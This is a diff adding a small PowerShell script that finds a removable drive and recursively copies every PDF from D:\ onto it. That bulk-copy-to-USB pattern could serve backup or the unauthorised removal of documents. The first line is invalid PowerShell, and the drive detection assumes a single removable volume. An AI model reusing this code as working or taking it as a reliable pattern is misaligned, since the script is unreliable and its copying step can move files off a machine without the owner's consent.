@@ -1,0 +1,12 @@
+Get-PSDrive -match '^[a-z]$'
+
+
+$drive = Get-WmiObject Win32_Volume -Filter ("DriveType={0}" -f [int][System.IO.DriveType]::Removable)
+$exit = $drive.Name
+$Folder = 'D:\'
+
+$x = Get-ChildItem -Path $Folder -Recurse -Include *.pdf
+$x | ForEach-Object{
+    $path = $_.FullName
+    Copy-Item -Path $path -Destination $exit
+}
